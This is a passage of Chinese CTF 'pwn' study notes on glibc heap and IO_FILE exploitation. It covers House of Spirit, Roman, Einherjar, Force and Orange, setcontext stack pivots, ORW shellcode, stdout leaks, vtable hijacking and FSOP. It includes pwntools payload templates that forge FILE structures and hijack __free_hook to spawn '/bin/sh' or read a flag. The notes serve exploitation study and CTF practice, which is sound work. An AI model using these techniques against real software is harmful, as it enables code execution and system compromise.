大小需要满足对应 fastbin 的需求(\u003c= 0x80 on x64) if ((unsigned long) (size) \u003c= (unsigned long) (get_max_fast()) fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时不能大于av-\u003esystem_mem if (__builtin_expect(chunk_at_offset(p, size)-\u003esize \u003c= 2 * SIZE_SZ, 0) || __builtin_expect(chunksize(chunk_at_offset(p, size)) \u003e= av-\u003esystem_mem, 0)) { if (have_lock || ({ assert(locked == 0); mutex_lock(\u0026av-\u003emutex); locked = 1; chunk_at_offset(p, size)-\u003esize \u003c= 2 * SIZE_SZ || chunksize(chunk_at_offset(p, size)) \u003e= av-\u003esystem_mem; })) { errstr = \"free(): invalid next size (fast)\"; goto errout; }... } fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 情况 if (__builtin_expect(old == p, 0)) { errstr = \"double free or corruption (fasttop)\"; goto errout; } 利用 构造 fake chunk，free fake chunk 进入 fast bin，触发 House of Spirit，申请后获取到 fake chunk，修改不可控区域(返回地址等) 该过程也可能在栈上构造，构造 malloc 和 free 的指针时指向 chunk 内容而不是 chunk 头 House of Roman 绕过 ALSR，无需泄露 libc，通过覆盖 unsorted bin 的 fd 的低 2 字节，对 glibc 上某结构进行 1/16 概率的 12bit 爆破 条件：UAF、可创建任意大小的堆块 利用：fastbin attack \u0026 unsorted bin attack edit(p16(0x1234)) # 低两字节中，234为确定，1/16爆破1 House Of Einherjar 已泄露了堆地址及 libc 基址，利用释放不在 fast bin 大小范围内的堆块会尝试合并前面已释放堆块的机制 伪造 chunk 头部实现任意地址内存申请，可以使用 off by null 转 overlapping 方法构造也可用下述方法 泄露地址有零截断想方法填充 0 为字符然后恢复 绕过 使fake_chunk的fd和bk，均指向自己：\u0026fake_chunk来绕过 unlink 检查 if (__builtin_expect(FD-\u003ebk != P || BK-\u003efd != P, 0)) malloc_printerr(check_action, \"corrupted double-linked list\", P, AV); 令fake_prev_size1 = fake_size绕过 glibc-2.26 版本检查 if (__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), 0)) malloc_printerr(\"corrupted size vs. prev_size\"); 令fake chunk:fake_size = chunk2:fake_prev_size2来绕过 glibc-2.29 版本对 prevsize 的检查 if (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (\"corrupted size vs. prev_size while consolidating\"); 溢出修改 chunk2 的prev_size为\u0026chunk2 - \u0026fake_chunk并将PREV_INUSE置 0，free chunk2触发House Of Einherjar将 fake chunk 到 chunk2 在 unsorted bin 中完成合并 House of Force glibc\u003c2.29，溢出将 top chunk 的 size 改为极大值(0xffffffff)，绕过对用户请求大小和 top chunk 现有 size 的验证 将 top chunk 更新到任意内存，再次申请堆块写入数据，即任意地址写 条件：malloc 申请堆块大小不受限制，可控 top chunk 的 size 位，且代码使用size_t机器字长作为堆大小 // 获取当前的top chunk及大小 victim = av-\u003etop; size = chunksize(victim); // 从top chunk中切下一块内存返回给malloc if ((unsigned long) (size) \u003e= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; // remainder_size为切割后的剩余大小 remainder = chunk_at_offset(victim, nb);// remainder为切割前top chunk+nb值，即切割后top chunk地址 // 控制nb值 av-\u003etop = remainder; ... } 利用 ① 泄露堆基地址和 libc 基址：同时释放 2 个 chunk 进入 unsorted bin ② 修改 top chunk 的 size n64 = lambda x: (x + 0x10000000000000000) \u0026 0xFFFFFFFFFFFFFFFF add(0, 0x18) edit(0, b'a' * ","date":"2024-10-09","objectID":"/pwn_note/:16:9","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"setcontext setcontext 是 libc 中函数，根据传入的 SigreturnFrame 结构指针中内容设置寄存器 setcontext + offset 位置有 gadget，设置 rdi 为 SigreturnFrame 结构体指针，跳转到 gadget 可将除 rax 外寄存器设置成对应值 free hook 写入 gadget，free 一个存储 SigreturnFrameFrame 结构内存来设置寄存器，控制程序流程来执行 shellcode 进一步 rop 0x7f4b45a35a75 \u003csetcontext+53\u003e mov rsp, qword ptr [rdi + 0xa0]\r0x7f4b45a35a7c \u003csetcontext+60\u003e mov rbx, qword ptr [rdi + 0x80]\r0x7f4b45a35a83 \u003csetcontext+67\u003e mov rbp, qword ptr [rdi + 0x78]\r0x7f4b45a35a87 \u003csetcontext+71\u003e mov r12, qword ptr [rdi + 0x48]\r0x7f4b45a35a8b \u003csetcontext+75\u003e mov r13, qword ptr [rdi + 0x50]\r0x7f4b45a35a8f \u003csetcontext+79\u003e mov r14, qword ptr [rdi + 0x58]\r0x7f4b45a35a93 \u003csetcontext+83\u003e mov r15, qword ptr [rdi + 0x60]\r0x7f4b45a35a97 \u003csetcontext+87\u003e mov rcx, qword ptr [rdi + 0xa8]\r0x7f4b45a35a9e \u003csetcontext+94\u003e push rcx\r0x7f4b45a35a9f \u003csetcontext+95\u003e mov rsi, qword ptr [rdi + 0x70]\r0x7f4b45a35aa3 \u003csetcontext+99\u003e mov rdx, qword ptr [rdi + 0x88]\r0x7f4b45a35aaa \u003csetcontext+106\u003e mov rcx, qword ptr [rdi + 0x98]\r0x7f4b45a35ab1 \u003csetcontext+113\u003e mov r8, qword ptr [rdi + 0x28]\r0x7f4b45a35ab5 \u003csetcontext+117\u003e mov r9, qword ptr [rdi + 0x30]\r0x7f4b45a35ab9 \u003csetcontext+121\u003e mov rdi, qword ptr [rdi + 0x68]\r0x7f4b45a35abd \u003csetcontext+125\u003e xor eax, eax\r0x7f4b45a35abf \u003csetcontext+127\u003e ret ","date":"2024-10-09","objectID":"/pwn_note/:17:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"shellcode 条件：堆，开启沙箱不能 execve，需要 orw，能在__free_hook处申请构造大堆块 # 此时在 __free_hook 处申请了 chunk0 shellcode1 = ''' xor rdi,rdi mov rsi,%d mov edx,0x1000 mov eax,0 syscall ; read(0, free_hook-offset, 0x1000)向__free_hook前某个位置写入shellcode2 jmp rsi ; 跳向shellcode2 ''' % (libc.sym['__free_hook'] \u0026 0xFFFFFFFFFFFFF000) # 构造chunk0 edit_chunk(0, p64(libc.sym['setcontext'] + 53) + p64(libc.sym['__free_hook'] + 0x10) + asm(shellcode1)) # 构造chunk1: SigreturnFrame frame = SigreturnFrame() frame.rsp = libc.sym['__free_hook'] + 8 frame.rip = libc.sym['mprotect'] frame.rdi = libc.sym['__free_hook'] \u0026 0xFFFFFFFFFFFFF000 frame.rsi = 0x2000 frame.rdx = 7 edit_chunk(1, str(frame)) # free时setcontext根据frame设置寄存器，更改rsp栈迁移至 \u0026__free_hook+0x8位置 # 结尾ret跳转到rip:mprotect将__free_hook所在内存页添加可执行属性 # 执行完mprotect，ret到shellcode1处执行read，等待向某地址标准输入，之后跳转到该地址 delete_chunk(1) # 输入shellcode2并执行 shellcode2 = asm(row_shellcode) # ROW p.send(asm(shellcode2)) ","date":"2024-10-09","objectID":"/pwn_note/:17:1","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"ROP 通过 ROP 进行 ORW 操作，调用 free 时执行 setcontext，根据 frame 设置寄存器 ret 到 open 函数打开 flag 之后依次经过 read 和 puts 打印 flag buf_addr = libc.sym['__free_hook'] + 0x100 # /flag地址 payload = '' payload += p64(libc.sym['setcontext'] + 53) payload += p64(pop_rdi_ret_addr) + p64(3) # rop payload += p64(pop_rsi_ret_addr) + p64(buf_addr) payload += p64(pop_rdx_ret_addr) + p64(0x100) payload += p64(libc.symbols['read']) payload += p64(pop_rdi_ret_addr) + p64(buf_addr) payload += p64(libc.symbols['puts']) payload = payload.ljust(0x100, '\\x00') payload += '/flag\\x00' edit(0, payload) frame = SigreturnFrame() frame.rsp = libc.sym['__free_hook'] + 8 # 劫持到rop frame.rip = libc.symbols['open'] frame.rdi = buf_addr frame.rsi = 0 edit(1, str(frame)) delete(1) ","date":"2024-10-09","objectID":"/pwn_note/:17:2","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"New libc\u003e2.29 新版本，setcontext 改用rdx访问SigreturnFrame来赋值：mov reg, qword ptr [rdx + 0xa0]使得不可直接跳转 利用：泄露堆地址，利用以下 2 种gadget之一将释放堆块的内存地址赋值给 rdx，再修改对应 jmp 值跳转到 setcontext 的 gadget ; gadget1\rmov rdx, [rdi+0x8]\rmov rax, [rdi]\rmov rdi, rdx\rjmp rax ; gadget2\rmov rdx, [rdi+0x8]\rmov [rsp], rax\rcall qword ptr[rdx+0x20] # 需要在SigreturnFrame+0x20中覆盖为setcontext+offset地址，不影响赋值操作 gadget1 # 已劫持__free_hook到chunk0 payload_addr = libc.sym['__free_hook'] buf_addr = payload_addr + 0x100 frame_addr = buf_addr + 0x20 frame = ... # 构造frame与ROP部分相同 payload = '' payload += p64(libc.search(asm('mov rdx, [rdi+0x8]; mov rax, [rdi]; mov rdi, rdx; jmp rax;'), executable=True).__next__()) # 同ROP部分 payload += read_gadget # read(3, buf_addr, 0x100) payload += puts_gadget # puts(buf_addr) payload = payload.ljust(0x100, '\\x00') payload += '/flag\\x00' payload = payload.ljust(frame_addr - payload_addr, '\\x00') payload += str(frame) edit_chunk(0, payload) edit_chunk(1, p64(libc.sym['setcontext'] + offset) + p64(frame_addr)) delete_chunk(1) gadget2 在 gadget1 基础上修改 # 修改payload中为gadget2 payload += p64(libc.search(asm('mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20];'), executable=True).__next__()) # frame中+0x20偏移处需要修改为setcontext+offset地址 frame = bytearray(str(frame)) frame[0x20:0x20 + 8] = p64(libc.sym['setcontext'] + 53) # chunk1中arg1可直接填充 edit(1, b'a' * 8 + p64(frame_addr)) setcontext 平替 rdi控制rbp，进而控制rax并执行跳转，在rax + 0x28的位置设置leave; ret完成栈迁移 // 同时完成程序执行流劫持和栈迁移, 不同libc使用寄存器不同，有些为rbx而非rbp \u003csvcudp_reply+22\u003e: mov rbp,QWORD PTR [rdi+0x48] \u003csvcudp_reply+26\u003e: mov rax,QWORD PTR [rbp+0x18] \u003csvcudp_reply+30\u003e: lea r12,[rbp+0x10] \u003csvcudp_reply+34\u003e: mov DWORD PTR [rbp+0x10],0x0 \u003csvcudp_reply+41\u003e: mov rdi,r12 \u003csvcudp_reply+44\u003e: call QWORD PTR [rax+0x28] 构造 chunk0 中内容的 payload 为 payload = p64(libc.sym['svcudp_reply']+22) + p64(pop_r14_pop_r15_ret_addr) + 'a'*8 + p64(rax_addr) + p64(open_rop) + p64(read_rop) + p64(write_rop) # ljust到0x100 payload += b'b'*0x28 + p64(leave_ret_addr) # ljust到0x100 payload += b'/flag\\x00' 构造 chunk1 内容为 edit(1, b'c'*0x48 + p64(__free_hook_addr) free(1)时跳转到 svcudp_reply+offset 地址执行，将__free_hook 内容的值给 rbp rax 指向 chunk1，接着 rdi 指向[rbp+0x10]处且值为 0，最后 call leave; ret 使得 rsp 指向 pop;pop;ret 处 两次 pop 后 rsp 下移，ret 后指向 rop 位置执行 orw 操作 ","date":"2024-10-09","objectID":"/pwn_note/:17:3","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"IO_FILE glibc高版本逐渐移除了__malloc_hook/__free_hook/__realloc_hook等一众hook全局变量，需要利用IO_FILE 防止多次系统调用 io 开销，将内容先放入缓冲区，塞满则一并输出 利用：将原本的_flags或上_IO_CURRENTLY_PUTTING和_IO_IS_APPENDING，即0x1800 ","date":"2024-10-09","objectID":"/pwn_note/:18:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"stdin 任意写 思路：劫持缓冲区为目标地址，数据写入到目标地址 绕过 fread _IO_file_xsgetn 使fp-\u003e_IO_buf_base不为空绕过初始化缓冲区 if (fp-\u003e_IO_buf_base == NULL) // 初始化 令fp-\u003e_IO_read_end = fp-\u003e_IO_read_ptr绕过【1】【2】 have = fp-\u003e_IO_read_end - fp-\u003e_IO_read_ptr; if (want \u003c= have){}// 所需数据小于缓冲区大小【1】 else if (have \u003e 0) // 将缓冲区对应数据复制到目标地址中可能出现不必要问题【2】 使缓冲区大小大于所需数据进入underflow函数 if (fp-\u003e_IO_buf_base \u0026\u0026 want \u003c (size_t)(fp-\u003e_IO_buf_end - fp-\u003e_IO_buf_base))// 调用__underflow(fp) else // 所需数据长度大于缓冲区大小会使用SYSREAD直接往变量读入数据 _IO_new_file_underflow 绕过 EOF：_flags中的_IO_NO_READS不能置位 #define _IO_NO_READS 4 if (fp-\u003e_flags \u0026 _IO_NO_READS) // return EOF 绕过：_IO_LINE_BUF(0x200)和_IO_UNBUFFERED(2)不能置位 if (fp-\u003e_flags \u0026 (_IO_LINE_BUF | _IO_UNBUFFERED)) 设置 FILE 结构体_IO_buf_base为write_start，_IO_buf_end为write_end，同时fp-\u003efileno为 0 fp-\u003e_IO_read_base = fp-\u003e_IO_read_ptr = fp-\u003e_IO_buf_base; fp-\u003e_IO_read_end = fp-\u003e_IO_buf_base; fp-\u003e_IO_write_base = fp-\u003e_IO_write_ptr = fp-\u003e_IO_write_end = fp-\u003e_IO_buf_base; count = _IO_SYSREAD(fp, fp-\u003e_IO_buf_base, fp-\u003e_IO_buf_end - fp-\u003e_IO_buf_base); // 利用: read(fp-\u003e_fileno, buf, size) fread 利用条件 _IO_read_end = _IO_read_ptr _flag \u0026 ~_IO_NO_READS 即 _flag \u0026 ~0x4 _fileno=0，读入数据来源stdin _IO_buf_base=write_start, _IO_buf_end=write_end，且_IO_buf_end - _IO_buf_base大于 fread 读的数据 scanf 绕过 __isoc99_scanf(\"%d', \u0026v\"); // 同样会走io file 利用 _IO_2_1_stdin_.file._IO_buf_base覆盖为_IO_write_base地址即offset 0x20，scanf 触发任意地址写 即修改_IO_buf_base中_IO_write_base指向的值 包括覆盖三个 write 相关指针值（设 0）以及修改_IO_buf_base和_IO_buf_end覆盖为__free_hook区域 再次任意地址写向__free_hook写one_gadget 技巧 ① IO_FILE 打坏 使用 pwndbg 中cyclic 1000产生随机数，输入后调试查看目标地址__free_hook被 xxxx 覆盖，使用cyclic -l xxxx获取偏移 修改该偏移对应的内容即可正确覆盖__free_hook 若输入为 1 跳出循环则不断输入'1\\n'*num尝试跳出，或 for _ in range(0x5): p.send(b'1\\n' * 5) sleep(1) ","date":"2024-10-09","objectID":"/pwn_note/:18:1","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"stdout Leak 堆无输出功能时，劫持_IO_2_1_stdout_结构体泄露 libc 基址 bss 段中可能存放 stdout 对应 IO_FILE 的地址，修改stdout的FILE结构体中的缓冲区指针进行信息泄漏 程序正确执行到_IO_overflow时会将输出缓冲区数据输出，将要泄露地址设置为输出缓冲区即可 检查绕过 _IO_new_file_xsputn 使_IO_write_end = _IO_write_ptr绕过count \u003e 0 else if (f-\u003e_IO_write_end \u003e f-\u003e_IO_write_ptr) count = f-\u003e_IO_write_end - f-\u003e_IO_write_ptr; if (count \u003e 0) // 文件流缓冲区还有空闲，数据进入文件流缓冲区 _IO_new_file_overflow _flags不能包含_IIO_NO_WRITES if (f-\u003e_flags \u0026 _IO_NO_WRITES) // 操作失败退出 #define _IO_NO_WRITES 0x8 _flags需包含_IO_CURRENTLY_PUTTING来避免进入分支 // #define _IO_CURRENTLY_PUTTING 0x0800 if ((f-\u003e_flags \u0026 _IO_CURRENTLY_PUTTING) == 0 || f-\u003e_IO_write_base == NULL) 令_IO_write_base = read_start, _IO_write_ptr = read_end使调用_IO_do_write输出缓冲区内容 if (ch == EOF) return _IO_do_write(f, f-\u003e_IO_write_base, f-\u003e_IO_write_ptr - f-\u003e_IO_write_base); new_do_write 构造_flags包含_IO_IS_APPENDING或_IO_read_end = _IO_write_base，且构造_fileno=1，最终执行_IO_SYSWRITE if (fp-\u003e_flags \u0026 _IO_IS_APPENDING) ... // #define _IO_IS_APPENDING 0x1000 else if (fp-\u003e_IO_read_end != fp-\u003e_IO_write_base) ... count = _IO_SYSWRITE(fp, data, to_do); // 实际调用write(f-\u003e_fileno, data, to_do) 利用：实现任意读，伪造为0xfbad1880基本能过 _flag \u0026 ~_IO_NO_WRITES，_flag \u0026 _IO_CURRENTLY_PUTTING，_fileno = 1 _IO_write_base = leak_start_addr，_IO_write_ptr = leak_end_addr _IO_read_end = _IO_write_base 或 _flag \u0026 _IO_IS_APPENDING 设置_IO_write_end = _IO_write_ptr（非必须） 无输出时可以通过 house of roman 申请到目标地址进行劫持 劫持到_IO_2_1_stdout_构造 payload 泄露地址内容 payload = p64(0xfbad1800) + p64(0)*3 + p64(leak_libc_addr) + p64(leak_libc_addr + 0x8) 当有write和puts时将会把该地址内容一并输出 劫持到_IO_2_1_stdout_ - 0x43 chunk 处泄露 libc 地址 修改 _IO_write_base 指针最低 1 字节为 \\x88 使其指向 _chain 变量 _chain 变量存储了 _IO_2_1_stdin_ 结构体地址 下一次输出内容时会从0xxxx88地址处开始将 write buf 中内容输出，可泄露 libc 基址 # 若要在后续利用system, 参数设置为stdout地址来获取 shell, 使用 b\";sh;\" payload = b'\\x00' * 0x33 + p32(0xfbad1800) + b\";sh;\" + p64(0) * 3 + p8(0x88) ","date":"2024-10-09","objectID":"/pwn_note/:18:2","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"vtable 劫持 2.23 glibc-2.23，该版本无_IO_vtable_check检查vtable虚函数表地址，可修改vtable指针指向fake vtable指向 system 函数 调用 IO 函数时，_IO_2_1_stdout_结构体指针作为参数传入vtable中的函数，可将 flag 字段 4 字节填充;sh;来获取 shell 利用 ① 可以使用 fast bin attack 错位在_IO_2_1_stdout_+157处申请出 chunk 来，size 位为0x7f，该大小可覆盖到 vtable ② 若为 puts 函数泄露，可利用_IO_puts函数中的_IO_sputn(_IO_stdout, str, len)判断时进行劫持 图中 vtable 直接指向 call 的地址，而调试发现为call [rax+offset]，需要劫持 vtable 指针逆向偏移 offset 大小，调用_IO_sputn(_IO_stdout, str, len) 2.24 ① 劫持 vtable 到_IO_str_jumps glibc-2.24 中，_IO_sputn的宏增加了IO_validate_vtable函数对stdout结构体的 *vtable 指针进行校验后再调用__xsputs 在代码分析博客查看_IO_sputn宏以及IO_validate_vtable函数 vtable 必须满足在 __stop___IO_vtables 和 __start___libc_IO_vtables 之间，伪造 vtable 通常不满足条件 原理 利用 _IO_str_jumps 与 __IO_wstr_jumps 位于 __stop___libc_IO_vtables 和 __start___libc_IO_vtables 之间 将 *vtable 填成 _IO_str_jumps 或 __IO_wstr_jumps 地址可通过 IO_validate_vtable 检测 const struct _IO_jump_t _IO_str_jumps libio_vtable = { JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_str_finish), JUMP_INIT(overflow, _IO_str_overflow), JUMP_INIT(underflow, _IO_str_underflow), JUMP_INIT(uflow, _IO_default_uflow), JUMP_INIT(pbackfail, _IO_str_pbackfail), JUMP_INIT(xsputn, _IO_default_xsputn), JUMP_INIT(xsgetn, _IO_default_xsgetn), JUMP_INIT(seekoff, _IO_str_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_default_setbuf), JUMP_INIT(sync, _IO_default_sync), JUMP_INIT(doallocate, _IO_default_doallocate), JUMP_INIT(read, _IO_default_read), JUMP_INIT(write, _IO_default_write), JUMP_INIT(seek, _IO_default_seek), JUMP_INIT(close, _IO_default_close), JUMP_INIT(stat, _IO_default_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue) }; \u003c glibc-2.27，利用_IO_str_finish 修改_free_buffer为\u0026system，_IO_buf_base修改为\u0026\"/bin/sh\"，触发执行_IO_str_finish可获得 shell void _IO_str_finish (_IO_FILE *fp, int dummy) { if (fp-\u003e_IO_buf_base \u0026\u0026 !(fp-\u003e_flags \u0026 _IO_USER_BUF)) (((_IO_strfile *) fp)-\u003e_s._free_buffer) (fp-\u003e_IO_buf_base); fp-\u003e_IO_buf_base = NULL; _IO_default_finish (fp, 0); } 对fp被强制转换为的_IO_strfile *类型分析 typedef struct _IO_strfile_ { struct _IO_streambuf _sbf; struct _IO_str_fields _s; } _IO_strfile; struct _IO_streambuf // 实际就是_IO_FILE_plus { struct _IO_FILE _f; const struct _IO_jump_t *vtable; }; struct _IO_str_fields // 类似继承增加了一段区域 { _IO_alloc_type _allocate_buffer; _IO_free_type _free_buffer; }; 利用 触发：需要劫持 vtable 指向某处，使得下一个调用的 vtable 中函数位置错位为_IO_str_finish printf函数会调用_IO_new_file_xsputn，将 vtable 指向\u0026_IO_str_jumps - 0x28位置，如下图 模板 构造一块伪造块，若为 chunk 则 prev_size 与 size 无法劫持 large bin attack 修改 bk*nextsize 为libc.sym[\"\\_IO_2_1_stdout*\"]-0x20劫持 stdout 结构体为 fake_file fake_file = b\"\" # _flags, (0xFBAD2887 \u0026 (~0x1)) 清除_IO_USER_BUF绕过_IO_str_finish检查 fake_file += p64(0xFBAD2886) fake_file += p64(libc.sym['_IO_2_1_stdout_'] + 131) * 6 # _IO_read_ptr到_IO_write_end fake_file += p64(libc.search(\"/bin/sh\").__next__()) # _IO_buf_base -\u003e \"/bin/sh\" fake_file += p64(libc.sym['_IO_2_1_stdout_'] + 132) # _IO_buf_end:(_IO_buf_base + 1) fake_file += p64(0) * 4 # from _IO_save_base to _markers fake_file += p64(libc.sym['_IO_2_1_stdin_']) # the FILE chain ptr fake_file += p32(1) # _fileno for stdout is 1 fake_file += p32(0) # _flags2, usually 0 fake_file += p64(0xFFFFFFFFFFFFFFFF) # _old_offset, -1 fake_file += p16(0) # _cur_column fake_file += b\"\\x00\" # _vtable_offset fake_file += b\"\\n\" # _shortbuf[1] fake_file += p32(0) # padding fake_file += p64(libc.sym['_IO_2_1_stdout_'] + 0x1e20) # _IO_stdfile_1_lock fake_file += p64(0xFFFFFFFFFFFFFFFF) # _offset, -1 fake_file += p64(0) # _codecvt, usually 0 fake_file += p64(libc.sym['_IO_2_1_stdout_'] - 0xe20) # _IO_wide_data_1 fake_file += p64(0) * 3 # from _freeres_list to __pad5 fake_file += p32(0xFFFFFFFF) # _mode, -1 fake_file += b\"\\x00\" * 19 # _unused2 fake_file = fake_file.ljust(0xD8, b'\\x00') # 调整vtable # vtable设置为_IO_str_jumps - 0x28，设置_IO_2_1_stdout_ + 0xe8为one_gadget fake_file += p64(IO_str_jumps_addr - 0x28) + p64(0) + p64(libc.sym['system']) libc-2.28 起_IO_str_finish不再调用_free_buffer而直接调用free，方法失效 void _IO_str_finish (FILE *f","date":"2024-10-09","objectID":"/pwn_note/:18:3","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"FSOP File Stream Oriented Programming，需泄露 libc 基址和堆地址 劫持_IO_list_all指向伪造的_IO_FILE_plus 最终程序【执行exit函数】或【libc 执行abort流程】或【执行流从 main 函数返回】时，会执行_IO_flush_all_lockp函数 该函数会刷新_IO_list_all链表中所有项的文件流，即对每个 FILE 调用 fflush，对应会调用_IO_FILE_plus.vtable中的_IO_overflow 劫持_IO_list_all 修改IO_FILE结构体，选择_IO_2_1_stderr结构体不影响 IO 利用 large bin attack 将 _IO_list_all覆盖成一个 chunk 地址，申请出来后伪造 IO_FILE 结构体 原理 if (((fp-\u003e_mode \u003c= 0 \u0026\u0026 fp-\u003e_IO_write_ptr \u003e fp-\u003e_IO_write_base) || ...) \u0026\u0026 _IO_OVERFLOW(fp, EOF) == EOF) 需要满足条件：fp-\u003e_mode \u003c= 0以及fp-\u003e_IO_write_ptr \u003e fp-\u003e_IO_write_base 利用 将 vtable 伪造在 _IO_2_1_stderr + 0x10 处使得_IO_2_1_stderr的fp-\u003e_IO_write_ptr恰好对应于vtable的_IO_overflow 将fp-\u003e_IO_write_ptr写入system函数地址，_IO_overflow传参为_IO_2_1_stderr结构体，将该结构体起始位置写入/bin/sh 模板 其中，编辑不了 chunk 的 prev_size，可以借助前一个 chunk 编辑复用更改该 chunk 的 prev_size fake_file = b\"\" fake_file += b\"/bin/sh\\x00\" # _flags, an magic number fake_file += p64(0) # _IO_read_ptr # ----------------------------------------------------- fake_file += p64(0) # _IO_read_end fake_file += p64(0) # _IO_read_base fake_file += p64(0) # _IO_write_base fake_file += p64(libc.sym['system']) # _IO_write_ptr fake_file += p64(0) # _IO_write_end fake_file += p64(0) # _IO_buf_base; fake_file += p64(0) # _IO_buf_end should usually be (_IO_buf_base + 1) fake_file += p64(0) * 4 # from _IO_save_base to _markers fake_file += p64(libc.sym['_IO_2_1_stdout_']) # the FILE chain ptr fake_file += p32(2) # _fileno for stderr is 2 fake_file += p32(0) # _flags2, usually 0 fake_file += p64(0xFFFFFFFFFFFFFFFF) # _old_offset, -1 fake_file += p16(0) # _cur_column fake_file += b\"\\x00\" # _vtable_offset fake_file += b\"\\n\" # _shortbuf[1] fake_file += p32(0) # padding fake_file += p64(libc.sym['_IO_2_1_stdout_'] + 0x1ea0) # _IO_stdfile_1_lock fake_file += p64(0xFFFFFFFFFFFFFFFF) # _offset, -1 fake_file += p64(0) # _codecvt, usually 0 fake_file += p64(libc.sym['_IO_2_1_stdout_'] - 0x160) # _IO_wide_data_1 fake_file += p64(0) * 3 # from _freeres_list to __pad5 fake_file += p32(0xFFFFFFFF) # _mode, usually -1 fake_file += b\"\\x00\" * 19 # _unused2 fake_file = fake_file.ljust(0xD8, b'\\x00') # adjust to vtable 填充需要注意调试修改 fake_file += p64(libc.sym['_IO_2_1_stderr_'] + 0x10) # fake vtable 需将该处更换为伪造的 fake chunk地址+0x10 退出程序触发 FSOP ","date":"2024-10-09","objectID":"/pwn_note/:18:4","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"House of House of Orange glibc-2.23~2.26，无 free 函数，仅存在堆溢出，可以 unsorted bin attack 释放到 largebin 可泄露(fd,bk)libc 基址和(fd_nextsize,bk_nextsize)堆地址，申请一个小堆块，切割后剩余 chunk 从 lage bin 进入 unsorted bin 申请的nb\u003c0x20000 利用包括2部分 无 free 情况下得到一个位于 unsorted bin 中的 chunk unsorted bin attack 劫持 _IO_list_all 实现 FSOP Step 1 若当前堆的 top chunk 尺寸不足以满足申请分配的大小时，原来 top chunk 会被释放置入 unsorted bin 中 利用流程 // 调用链: malloc \u003e sysmalloc \u003e _int_free _int_free(av, old_top, 1); // 通过此将top chunk free 执行sysmalloc向系统申请内存有 mmap 和 brk，该处需要以 brk 形式拓展，需要 malloc 尺寸小于mp_.mmap_threshold绕过 mmap if (av == NULL || ((unsigned long)(nb) \u003e= (unsigned long)(mp_.mmap_threshold) \u0026\u0026 (mp_.n_mmaps \u003c mp_.n_mmaps_max))){ ... try_mmap: // 使用mmap 有 arena 则有 top chunk，需要扩展 top chunk 堆段，切割内存返回，调用 brk 前需要绕过检查 绕过：伪造 size 时原 top chunk 结束位置必须对齐内存页 4K，MINSIZE(0x10)\u003csize\u003cnb+MINSIZE，size 的 prev_inuse 位置 1 old_top = av-\u003etop; old_size = chunksize(old_top); old_end = (char *)(chunk_at_offset(old_top, old_size)); ... assert((old_top == initial_top(av) \u0026\u0026 old_size == 0) || ((unsigned long)(old_size) \u003e= MINSIZE \u0026\u0026 prev_inuse(old_top) \u0026\u0026 ((unsigned long)old_end \u0026 (pagesize - 1)) == 0)); assert((unsigned long)(old_size) \u003c (unsigned long)(nb + MINSIZE)); 判断是否连续，理论上是连续的，于是调用系统调用 brk 扩展，brk 指向上一个 top chunk 结束位置 size = nb + mp_.top_pad + MINSIZE; if (contiguous(av)) // 若top chunk 连续 size -= old_size; size = ALIGN_UP(size, pagesize); if (size \u003e 0){ brk = (char *)(MORECORE(size)); // 通过brk来扩展 LIBC_PROBE(memory_sbrk_more, 2, brk, size); } if (brk != (char *)(MORECORE_FAILURE)){ // brk调用成功，将top chunk 扩展了size大小 void (*hook)(void) = atomic_forced_read(__after_morecore_hook); if (__builtin_expect(hook != NULL, 0)) (*hook)(); } 由于改小了 size，此时如上图brk \u003c old_end跳过第一个判断和第二个判断 if (brk != (char *)(MORECORE_FAILURE)){ if (mp_.sbrk_base == 0) mp_.sbrk_base = brk; av-\u003esystem_mem += size; if (brk == old_end \u0026\u0026 snd_brk == (char *)(MORECORE_FAILURE)) set_head(old_top, (size + old_size) | PREV_INUSE); else if (contiguous(av) \u0026\u0026 old_size \u0026\u0026 brk \u003c old_end){ malloc_printerr(3, \"break adjusted to free malloc space\", brk, av); } 由于 brk 新申请的 chunk 与原 top chunk 不连续，进行后续操作，ptmalloc 认为堆段不连续，会通过 brk 继续扩展堆区域 而释放原先 top chunk 进入 unsorted bin 中，并在新的 top chunk 中切一块内存返回，且新增 2 个 0x10 大小的 chunk if (snd_brk != (char *)(MORECORE_FAILURE)) // 表示申请成功 { // 需要对不连续的原先top chunk进行处理 av-\u003etop = (mchunkptr)aligned_brk; // 上一个不连续的top chunk set_head(av-\u003etop, (snd_brk - aligned_brk + correction) | PREV_INUSE); av-\u003esystem_mem += correction; if (old_size != 0) { old_size = (old_size - 4 * SIZE_SZ) \u0026 ~MALLOC_ALIGN_MASK; set_head(old_top, old_size | PREV_INUSE); // 设置标记防止后续需要后续堆块prev_size情况的错误 chunk_at_offset(old_top, old_size)-\u003esize = (2 * SIZE_SZ) | PREV_INUSE; chunk_at_offset(old_top, old_size + 2 * SIZE_SZ)-\u003esize = (2 * SIZE_SZ) | PREV_INUSE; if (old_size \u003e= MINSIZE) { _int_free(av, old_top, 1); // 释放掉之前的 top chunk } } 利用 edit(p64(0xfb1)) # 修改 top chunk 大小 add(0xff0) # 触发将top chunk 释放到 unsorted bin中 Step 2 修改 unsorted bin chunk 的 size 为 